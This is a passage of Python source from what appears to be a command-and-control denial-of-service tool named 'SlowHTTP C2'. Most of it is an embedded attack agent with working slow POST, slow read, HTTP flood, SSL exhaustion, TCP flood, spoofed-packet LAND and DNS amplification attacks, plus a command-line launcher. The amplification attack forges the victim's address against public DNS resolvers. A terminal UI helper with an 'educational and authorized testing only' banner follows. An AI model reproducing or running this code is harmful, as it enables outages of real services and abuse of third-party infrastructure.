                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(data_chunk)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(conn)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Generate a random large content length
                            content_length = random.randint(10000000, 1000000000)
                            
                            # Send initial HTTP POST request headers
                            request = f"POST {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                            request += f"Content-Length: {content_length}\\r\\n"
                            request += "\\r\\n"
                            
                            # Send headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append({
                                "socket": new_s,
                                "bytes_sent": 0,
                                "content_length": content_length
                            })
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_read_attack(self, num_connections, delay, duration):
        """Slow Read attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow Read attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)  # Longer timeout for slow read
                    
                    # Set small receive buffer
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send complete HTTP request with small window size
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    # Set a small window size to slow down server response
                    request += "Accept-Encoding: identity\\r\\n"  # No compression
                    request += "Connection: keep-alive\\r\\n"
                    # Add a range header to request partial content
                    request += "Range: bytes=0-1\\r\\n"
                    request += "\\r\\n"
                    
                    # Send request
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 50 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 50 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Read data very slowly
            while time.time() < end_time and self.running:
                # Use select to find sockets with data to read
                readable, _, _ = select.select(self.connections, [], [], 1.0)
                
                for s in readable:
                    try:
                        # Read just 1 byte at a time
                        data = s.recv(1)
                        
                        if not data:
                            # Connection closed by server
                            with self.lock:
                                self.stats["connections_active"] -= 1
                                self.stats["error_count"] += 1
                            
                            try:
                                self.connections.remove(s)
                            except:
                                pass
                            
                            # Try to create a new connection
                            try:
                                self._create_slow_read_connection()
                            except Exception:
                                pass
                    except Exception as e:
                        # Connection error
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            self._create_slow_read_connection()
                        except Exception:
                            pass
                
                # Create new connections to replace any that were lost
                while len(self.connections) < num_connections and self.running:
                    try:
                        self._create_slow_read_connection()
                    except Exception:
                        break
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before next read cycle
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def _create_slow_read_connection(self):
        """Helper method to create a new slow read connection"""
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)  # Longer timeout for slow read
        
        # Set small receive buffer
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
        
        # Connect to target
        s.connect((self.target, self.port))
        
        # Wrap with SSL if needed
        if self.use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=self.target)
        
        # Send complete HTTP request with small window size
        request = f"GET {self.path} HTTP/1.1\\r\\n"
        request += f"Host: {self.target}\\r\\n"
        request += f"User-Agent: {self.user_agent}\\r\\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
        request += "Accept-Language: en-US,en;q=0.5\\r\\n"
        # Set a small window size to slow down server response
        request += "Accept-Encoding: identity\\r\\n"  # No compression
        request += "Connection: keep-alive\\r\\n"
        # Add a range header to request partial content
        request += "Range: bytes=0-1\\r\\n"
        request += "\\r\\n"
        
        # Send request
        s.send(request.encode())
        
        # Update stats
        with self.lock:
            self.stats["connections_active"] += 1
            self.stats["packets_sent"] += 1
            self.stats["bytes_sent"] += len(request)
        
        # Add to connections list
        self.connections.append(s)
    
    def http_flood_attack(self, num_connections, requests_per_connection, duration):
        """HTTP Flood attack"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting HTTP Flood attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Requests per connection: {requests_per_connection}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # Create thread pool
        threads = []
        
        # Function for each worker thread
        def worker():
            while time.time() < end_time and self.running:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    with self.lock:
                        self.stats["connections_active"] += 1
                    
                    # Send multiple requests on the same connection
                    for _ in range(requests_per_connection):
                        if not self.running or time.time() >= end_time:
                            break
                        
                        try:
                            # Generate random query parameters to bypass cache
                            random_param = f"?r={random.randint(1, 1000000)}"
                            
                            # Send HTTP request
                            request = f"GET {self.path}{random_param} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n\\r\\n"
                            
                            # Send request
                            s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Try to read response code
                            try:
                                response = s.recv(1024).decode('utf-8', errors='ignore')
                                if response.startswith('HTTP/'):
                                    status_code = response.split(' ')[1]
                                    with self.lock:
                                        if status_code not in self.stats["response_codes"]:
                                            self.stats["response_codes"][status_code] = 0
                                        self.stats["response_codes"][status_code] += 1
                            except:
                                pass
                            
                        except Exception as e:
                            with self.lock:
                                self.stats["error_count"] += 1
                            break
                    
                    # Close connection
                    try:
                        s.close()
                    except:
                        pass
                    
                    with self.lock:
                        self.stats["connections_active"] -= 1
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
        
        try:
            # Start worker threads
            for _ in range(num_connections):
                if not self.running:
                    break
                
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Monitor and report status
            while time.time() < end_time and self.running:
                # Print status update
                response_codes_str = ""
                if self.stats["response_codes"]:
                    codes = []
                    for code, count in self.stats["response_codes"].items():
                        codes.append(f"{code}: {count}")
                    response_codes_str = f", Response codes: {', '.join(codes)}"
                
                print(f"[*] Status: {self.stats['connections_active']} connections active, {self.stats['packets_sent']} packets sent, {self.stats['bytes_sent']} bytes sent, {self.stats['error_count']} errors{response_codes_str}")
                
                time.sleep(1)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def ssl_exhaust_attack(self, num_connections, delay, duration):
        """SSL Exhaustion attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting SSL Exhaustion attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create SSL context once
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Start SSL handshake
                    ssl_sock = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                    
                    # Add to connections list
                    self.connections.append(ssl_sock)
                    
                    # Sleep briefly between connections
                    if i % 50 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 50 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} SSL connections")
            
            # Keep connections alive and create new ones as needed
            while time.time() < end_time and self.running:
                # Check existing connections and remove dead ones
                active_connections = []
                for s in self.connections:
                    try:
                        # Send a heartbeat to keep connection alive
                        s.write(b"\\x00")
                        active_connections.append(s)
                    except Exception:
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                
                # Update connections list
                self.connections = active_connections
                
                # Create new connections to replace lost ones
                new_connections_needed = num_connections - len(self.connections)
                if new_connections_needed > 0:
                    for i in range(new_connections_needed):
                        if not self.running or time.time() >= end_time:
                            break
                            
                        try:
                            # Create socket
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            
                            # Connect to target
                            s.connect((self.target, self.port))
                            
                            # Start SSL handshake
                            ssl_sock = context.wrap_socket(s, server_hostname=self.target)
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                            
                            # Add to connections list
                            self.connections.append(ssl_sock)
                            
                        except Exception:
                            with self.lock:
                                self.stats["error_count"] += 1
                
                # Update stats
                with self.lock:
                    self.stats["connections_active"] = len(self.connections)
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} SSL connections active, {self.stats['packets_sent']} packets sent, {self.stats['error_count']} errors")
                
                # Sleep before next check
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def tcp_flood_attack(self, port, num_connections, duration):
        """TCP Flood attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting TCP Flood attack on {self.target}:{port}")
        print(f"[*] Connections: {num_connections}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # Create thread pool
        threads = []
        
        # Function for each worker thread
        def worker():
            local_connections = 0
            local_packets = 0
            
            while time.time() < end_time and self.running:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    
                    # Connect to target
                    s.connect((self.target, port))
                    
                    local_connections += 1
                    
                    # Send random data
                    for _ in range(10):  # Send multiple packets per connection
                        if not self.running or time.time() >= end_time:
                            break
                            
                        try:
                            # Generate random data
                            data = os.urandom(random.randint(1, 1024))
                            
                            # Send data
                            s.send(data)
                            
                            local_packets += 1
                            
                        except Exception:
                            break
                    
                    # Close connection
                    try:
                        s.close()
                    except:
                        pass
                    
                except Exception:
                    pass
            
            # Update global stats
            with self.lock:
                self.stats["packets_sent"] += local_packets
        
        try:
            # Start worker threads
            for _ in range(num_connections):
                if not self.running:
                    break
                
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Monitor and report status
            while time.time() < end_time and self.running:
                # Print status update
                with self.lock:
                    print(f"[*] Status: {len(threads)} threads active, {self.stats['packets_sent']} packets sent")
                
                time.sleep(1)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def land_attack(self, num_packets, duration):
        """LAND attack (same source and destination IP/port)"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting LAND attack on {self.target}")
        print(f"[*] Packets: {num_packets}, Duration: {duration}s")
        print(f"[*] WARNING: This attack requires raw socket privileges (root/administrator)")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Resolve target IP
            target_ip = socket.gethostbyname(self.target)
            
            # Create raw socket
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except PermissionError:
                print("[!] Error: This attack requires root/administrator privileges")
                return
            except Exception as e:
                print(f"[!] Error creating raw socket: {str(e)}")
                return
            
            # Send packets
            packets_sent = 0
            
            while time.time() < end_time and self.running and packets_sent < num_packets:
                try:
                    # Create IP header
                    source_ip = target_ip  # Same as target (LAND attack)
                    ihl = 5
                    version = 4
                    tos = 0
                    tot_len = 20 + 20  # IP header + TCP header
                    id = random.randint(1, 65535)
                    frag_off = 0
                    ttl = 255
                    protocol = socket.IPPROTO_TCP
                    check = 0
                    saddr = socket.inet_aton(source_ip)
                    daddr = socket.inet_aton(target_ip)
                    
                    ihl_version = (version << 4) + ihl
                    
                    # Pack IP header
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                                          ihl_version, tos, tot_len, id,
                                          frag_off, ttl, protocol, check,
                                          saddr, daddr)
                    
                    # Create TCP header
                    source_port = self.port  # Same as target port
                    dest_port = self.port
                    seq = random.randint(1, 4294967295)
                    ack_seq = 0
                    doff = 5
                    fin = 0
                    syn = 1
                    rst = 0
                    psh = 0
                    ack = 0
                    urg = 0
                    window = socket.htons(5840)
                    check = 0
                    urg_ptr = 0
                    
                    offset_res = (doff << 4) + 0
                    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
                    
                    # Pack TCP header
                    tcp_header = struct.pack('!HHLLBBHHH',
                                           source_port, dest_port, seq, ack_seq,
                                           offset_res, tcp_flags, window, check, urg_ptr)
                    
                    # Pseudo header for checksum calculation
                    source_address = socket.inet_aton(source_ip)
                    dest_address = socket.inet_aton(target_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    
                    psh = struct.pack('!4s4sBBH',
                                    source_address, dest_address,
                                    placeholder, protocol, tcp_length)
                    
                    psh = psh + tcp_header
                    
                    # Calculate TCP checksum
                    tcp_checksum = self._checksum(psh)
                    
                    # Pack TCP header again with checksum
                    tcp_header = struct.pack('!HHLLBBH',
                                           source_port, dest_port, seq, ack_seq,
                                           offset_res, tcp_flags, window) + \
                               struct.pack('H', tcp_checksum) + \
                               struct.pack('!H', urg_ptr)
                    
                    # Final packet
                    packet = ip_header + tcp_header
                    
                    # Send packet
                    s.sendto(packet, (target_ip, 0))
                    
                    # Update stats
                    packets_sent += 1
                    with self.lock:
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(packet)
                    
                    # Print status periodically
                    if packets_sent % 1000 == 0:
                        print(f"[*] Status: {packets_sent} packets sent")
                    
                    # Small delay to avoid overwhelming the system
                    time.sleep(0.001)
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    print(f"[!] Error sending packet: {str(e)}")
            
            print(f"[*] Attack completed: {packets_sent} packets sent")
            
        except Exception as e:
            print(f"[!] Attack error: {str(e)}")
        finally:
            # Clean up
            self.stop_attack()
    
    def dns_amplification_attack(self, target_ip, num_queries, duration):
        """DNS Amplification attack"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting DNS Amplification attack on {target_ip}")
        print(f"[*] Queries: {num_queries}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # List of public DNS servers to use
        dns_servers = [
            "8.8.8.8", "8.8.4.4",  # Google
            "1.1.1.1", "1.0.0.1",  # Cloudflare
            "9.9.9.9",             # Quad9
            "208.67.222.222",      # OpenDNS
            "64.6.64.6",           # Verisign
            "8.26.56.26",          # Comodo
            "156.154.70.1",        # Neustar
            "199.85.126.10",       # Norton
            "185.228.168.9",       # CleanBrowsing
            "76.76.19.19",         # Alternate DNS
            "94.140.14.14",        # AdGuard
            "192.71.245.208",      # SafeDNS
        ]
        
        # List of domains known to have large responses
        amplification_domains = [
            "isc.org",
            "ripe.net",
            "yahoo.com",
            "google.com",
            "amazon.com",
            "microsoft.com",
            "facebook.com",
            "apple.com",
            "netflix.com",
            "cloudflare.com"
        ]
        
        try:
            # Create UDP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Set socket options
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            
            # Send queries
            queries_sent = 0
            
            while time.time() < end_time and self.running and queries_sent < num_queries:
                try:
                    # Select random DNS server and domain
                    dns_server = random.choice(dns_servers)
                    domain = random.choice(amplification_domains)
                    
                    # Create DNS query packet
                    # Transaction ID
                    transaction_id = random.randint(0, 65535)
                    
                    # Flags (Standard query with recursion desired)
                    flags = 0x0100
                    
                    # Questions count
                    questions = 1
                    
                    # Other counts
                    answer_rrs = 0
                    authority_rrs = 0
                    additional_rrs = 0
                    
                    # Header
                    header = struct.pack('!HHHHHH', transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
                    
                    # Query
                    query_parts = domain.split('.')
                    query = b''
                    
                    for part in query_parts:
                        query += struct.pack('B', len(part))
                        query += part.encode()
                    
                    # Terminator, type (ANY), and class (IN)
                    query += struct.pack('!BHH', 0, 255, 1)  # ANY type (255) has larger responses
                    
                    # Complete packet
                    packet = header + query
                    
                    # Spoof source IP to target's IP
                    try:
                        # On Linux, we can use raw sockets to spoof the source IP
                        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        
                        # Create IP header
                        ihl = 5
                        version = 4
                        tos = 0
                        tot_len = 20 + 8 + len(packet)  # IP + UDP + DNS
                        id = random.randint(1, 65535)
                        frag_off = 0
                        ttl = 255
                        protocol = socket.IPPROTO_UDP
                        check = 0
                        saddr = socket.inet_aton(target_ip)  # Spoofed source IP
                        daddr = socket.inet_aton(dns_server)
                        
                        ihl_version = (version << 4) + ihl
                        
                        # Pack IP header
                        ip_header = struct.pack('!BBHHHBBH4s4s',
                                              ihl_version, tos, tot_len, id,
                                              frag_off, ttl, protocol, check,
                                              saddr, daddr)
                        
                        # Create UDP header
                        source_port = random.randint(1024, 65535)
                        dest_port = 53  # DNS
                        length = 8 + len(packet)  # UDP header + DNS packet
                        checksum = 0
                        
                        # Pack UDP header
                        udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)
                        
                        # Final packet
                        final_packet = ip_header + udp_header + packet
                        
                        # Send packet
                        raw_socket.sendto(final_packet, (dns_server, 0))
                        raw_socket.close()
                        
                    except (PermissionError, OSError):
                        # Fallback: regular UDP socket (won't spoof source IP)
                        s.sendto(packet, (dns_server, 53))
                    
                    # Update stats
                    queries_sent += 1
                    with self.lock:
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(packet)
                    
                    # Print status periodically
                    if queries_sent % 1000 == 0:
                        print(f"[*] Status: {queries_sent} queries sent")
                    
                    # Small delay to avoid overwhelming the system
                    time.sleep(0.001)
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    print(f"[!] Error sending query: {str(e)}")
            
            print(f"[*] Attack completed: {queries_sent} queries sent")
            
        except Exception as e:
            print(f"[!] Attack error: {str(e)}")
        finally:
            # Clean up
            s.close()
            self.stop_attack()
    
    def _checksum(self, data):
        """Calculate checksum for IP/TCP headers"""
        checksum = 0
        
        # Handle odd-length data
        if len(data) % 2 == 1:
            data += b'\\x00'
        
        # Sum all 16-bit words
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
        
        # Add carry
        while checksum >> 16:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        # One's complement
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def stop_attack(self):
        """Stop the attack and clean up connections"""
        self.running = False
        
        # Close all connections
        if hasattr(self, 'connections'):
            for conn in self.connections:
                try:
                    if isinstance(conn, dict) and 'socket' in conn:
                        conn['socket'].close()
                    else:
                        conn.close()
                except:
                    pass
            
            self.connections = []
        
        # Final stats update
        with self.lock:
            self.stats["connections_active"] = 0
        
        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")

def main():
    parser = argparse.ArgumentParser(description="Advanced SlowHTTP Attack Agent")
    parser.add_argument("--target", help="Target hostname or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--path", default="/", help="Target path (default: /)")
    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read", "http_flood", "ssl_exhaust", "tcp_flood", "land", "dns_amplification"], default="slowloris", help="Attack type")
    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("--requests", type=int, default=1000, help="Requests per connection for HTTP flood (default: 1000)")
    parser.add_argument("--target-ip", help="Target IP for DNS amplification attack")
    parser.add_argument("--version", action="store_true", help="Show version and exit")
    
    args = parser.parse_args()
    
    if args.version:
        print(f"Advanced SlowHTTP Attack Agent v{VERSION}")
        sys.exit(0)
    
    if not args.target:
        parser.print_help()
        sys.exit(1)
    
    # Parse URL if full URL is provided
    if args.target.startswith(("http://", "https://")):
        parsed_url = urlparse(args.target)
        target_host = parsed_url.netloc
        use_ssl = args.target.startswith("https://")
        path = parsed_url.path if parsed_url.path else "/"
        port = parsed_url.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        path = args.path
        port = args.port
    
    # Create attacker
    attacker = AdvancedHTTPAttacker(target_host, port, use_ssl, path=path)
    
    try:
        # Launch attack based on type
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_read":
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "http_flood":
            attacker.http_flood_attack(args.connections, args.requests, args.duration)
        elif args.attack_type == "ssl_exhaust":
            if not use_ssl:
                print("[WARNING] SSL Exhaust attack works best with HTTPS targets")
                use_ssl = True
                attacker.use_ssl = True
            attacker.ssl_exhaust_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "tcp_flood":
            attacker.tcp_flood_attack(port, args.connections, args.duration)
        elif args.attack_type == "land":
            attacker.land_attack(args.connections, args.duration)
        elif args.attack_type == "dns_amplification":
            if not args.target_ip:
                print("[ERROR] DNS Amplification attack requires --target-ip parameter")
                sys.exit(1)
            attacker.dns_amplification_attack(args.target_ip, args.connections, args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''

class TerminalHelper:
    """Terminal UI helper with improved formatting and input handling"""
    
    def __init__(self):
        """Initialize terminal helper"""
        self.terminal_width = self._get_terminal_width()
        self.spinner_frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        self.spinner_index = 0
    
    def _get_terminal_width(self):
        """Get terminal width with fallback"""
        try:
            return shutil.get_terminal_size().columns
        except:
            return 80  # Default fallback width
    
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════╗
║ {Colors.BOLD}SlowHTTP C2 - Advanced Distributed Testing Tool v{VERSION}{Colors.RESET}{Colors.CYAN} ║
║                                                                       ║
║ {Colors.YELLOW}⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!{Colors.RESET}{Colors.CYAN}                ║
╚═══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        print(banner)
    
    def print_header(self, title):
        """Print a section header"""
        width = self.terminal_width
        padding = max(0, width - len(title) - 4)
        left_pad = padding // 2
        right_pad = padding - left_pad
        
        print(f"{Colors.CYAN}{'═' * left_pad} {Colors.BOLD}{title}{Colors.RESET}{Colors.CYAN} {'═' * right_pad}{Colors.RESET}")
    
    def print_subheader(self, title):
        """Print a subsection header"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{title}{Colors.RESET}")
        print(f"{Colors.CYAN}{'-' * len(title)}{Colors.RESET}")
    
    def print_table(self, headers, data, max_width=None):
        """Print a formatted table with auto-sizing columns"""
        if not data:
            print(f"{Colors.YELLOW}No data to display{Colors.RESET}")
            return
        
        # Determine column widths
        col_widths = [len(str(h)) for h in headers]
        
        for row in data:
            for i, cell in enumerate(row):
                if i < len(col_widths):
                    col_widths[i] = max(col_widths[i], len(str(cell)))
        
        # Adjust for terminal width if needed
        if max_width is None:
            max_width = self.terminal_width
        
        total_width = sum(col_widths) + (3 * len(headers)) - 1
        if total_width > max_width:
            # Scale down columns proportionally
            excess = total_width - max_width
            for i in range(len(col_widths)):
                # Skip last column for better formatting
                if i == len(col_widths) - 1:
                    continue
                    
                # Calculate reduction based on column width proportion
                proportion = col_widths[i] / total_width
                reduction = int(excess * proportion)
                col_widths[i] = max(5, col_widths[i] - reduction)  # Minimum 5 chars
        
        # Print header
        header_row = " | ".join(str(headers[i]).ljust(col_widths[i]) for i in range(len(headers)))
        print(f"{Colors.BOLD}{header_row}{Colors.RESET}")
        
        # Print separator
        separator = "-+-".join("-" * col_widths[i] for i in range(len(headers)))
        print(separator)
        
        # Print data rows
        for row in data:
